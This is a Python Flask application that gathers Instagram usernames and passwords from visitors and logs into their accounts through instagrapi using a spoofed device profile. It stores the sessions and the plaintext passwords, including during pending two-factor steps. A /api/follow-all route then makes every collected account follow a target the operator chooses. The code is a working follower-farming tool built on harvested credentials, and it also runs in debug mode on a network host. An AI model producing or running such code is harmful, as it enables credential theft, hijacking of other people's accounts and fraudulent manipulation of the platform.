from flask import Flask, request, jsonify, render_template
from instagrapi import Client
import uuid, threading

# -----------------------------------
# FLASK SETTINGS – STATIC CACHE DISABLE
# -----------------------------------
app = Flask(__name__, template_folder='templates')
app.config['SEND_FILE_MAX_AGE_DEFAULT'] = 0  # Disable caching

pending_sessions = {}
pending_lock = threading.Lock()
logged_in_clients = {}

def make_session_id():
    return uuid.uuid4().hex

# -----------------------------------
# NO-CACHE HEADERS
# -----------------------------------
@app.after_request
def add_header(res):
    res.headers['Cache-Control'] = 'no-store, no-cache, must-revalidate, max-age=0'
    res.headers['Pragma'] = 'no-cache'
    res.headers['Expires'] = '0'
    return res

# -----------------------------------
# HOME PAGE (index.html)
# -----------------------------------
@app.route('/')
def index():
    return render_template('index.html')

# -----------------------------------
# FOLLOW PAGE (follow.html)
# -----------------------------------
@app.route('/follow')
def follow_redirect():
    return render_template('follow.html')

# -----------------------------------
# LOGIN API
# -----------------------------------
@app.route('/api/login', methods=['POST'])
def login_user():
    try:
        data = request.get_json()
        username = data.get('username')
        password = data.get('password')

        if not username or not password:
            return jsonify({'error': 'Missing username or password'}), 400

        cl = Client()
        cl.set_device({
            "app_version": "289.0.0.20.75",
            "android_version": "30",
            "android_release": "11",
            "dpi": "440dpi",
            "resolution": "1080x2340",
            "manufacturer": "Samsung",
            "device": "SM-G991B",
            "model": "Galaxy S21",
            "cpu": "exynos2100",
            "version_code": "289000020"
        })

        try:
            cl.login(username, password)
            logged_in_clients[username] = cl

            return jsonify({
                'ok': True,
                'message': f'Login saved for {username}',
                'redirect': '/follow'
            })

        except Exception as ex:
            text = str(ex).lower()

            if any(x in text for x in ['two-factor', 'verification_code', 'two factor']):
                session_id = make_session_id()
                with pending_lock:
                    pending_sessions[session_id] = {'username': username, 'password': password}
                return jsonify({'two_factor_required': True, 'session_id': session_id})

            if 'challenge' in text or 'select verify method' in text:
                session_id = make_session_id()
                with pending_lock:
                    pending_sessions[session_id] = {'username': username, 'password': password}
                return jsonify({'challenge_required': True, 'session_id': session_id})

            return jsonify({'error': 'login_failed', 'message': str(ex)}), 500

    except Exception as e:
        return jsonify({'error': 'Unexpected error', 'message': str(e)}), 500


# -----------------------------------
# FOLLOW ALL USERS API
# -----------------------------------
@app.route('/api/follow-all', methods=['POST'])
def follow_all_users():
    try:
        data = request.get_json()
        target_user = data.get("target")

        if not target_user:
            return jsonify({'error': 'Target missing'}), 400

        if not logged_in_clients:
            return jsonify({'error': 'No logged in users'}), 400

        first_cl = next(iter(logged_in_clients.values()))
        target_id = first_cl.user_id_from_username(target_user)

        results = []
        for username, cl in logged_in_clients.items():
            try:
                cl.user_follow(target_id)
                results.append(f"{username} → Followed")
            except Exception as e:
                results.append(f"{username} → Failed: {e}")

        return jsonify({'ok': True, 'results': results})

    except Exception as e:
        return jsonify({'error': 'Unexpected error', 'message': str(e)}), 500


# -----------------------------------
# RUN FLASK
# -----------------------------------
if __name__ == '__main__':
    app.run(host='10.46.130.147', port=8000, debug=True)
